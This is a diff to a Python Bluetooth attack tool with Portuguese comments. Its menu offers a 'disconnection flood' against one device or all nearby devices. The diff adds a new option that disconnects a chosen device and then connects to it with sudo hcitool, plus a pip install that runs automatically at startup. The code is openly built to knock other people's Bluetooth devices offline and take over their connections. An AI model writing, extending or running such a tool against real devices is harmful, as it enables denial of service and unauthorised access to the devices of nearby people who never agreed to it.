@@ -1,5 +1,18 @@
 import bluetooth
 import socket
+import subprocess
+
+# Instala as dependências usando o gerenciador de pacotes pip
+def install_dependencies():
+    dependencies = [
+        "pybluez"
+    ]
+
+    for dependency in dependencies:
+        try:
+            subprocess.check_call(["pip", "install", dependency])
+        except Exception as e:
+            print(f"Erro ao instalar a dependência {dependency}: {str(e)}")
 
 # Obtém o endereço IP do dispositivo automaticamente
 def get_device_ip():
@@ -33,7 +46,11 @@ def exibir_menu():
     print("Menu:")
     print("1. Realizar o flood de desconexão em um dispositivo específico")
     print("2. Realizar o flood de desconexão em todos os dispositivos próximos")
+    print("3. Desconectar um dispositivo específico e se conectar a ele")
     print("0. Sair")
+
+# Executa a instalação das dependências
+install_dependencies()
 
 # Loop principal do programa
 while True:
@@ -56,6 +73,16 @@ while True:
 
     elif escolha == "2":
         flood_disconnect_all()
+
+    elif escolha == "3":
+        device_address = get_target_device()
+        if device_address:
+            disconnect_device(device_address)
+            try:
+                subprocess.check_call(["sudo", "hcitool", "cc", device_address])
+                print(f"Conectado ao dispositivo {device_address} com sucesso.")
+            except Exception as e:
+                print(f"Erro ao se conectar ao dispositivo {device_address}: {str(e)}")
 
     elif escolha == "0":
         break
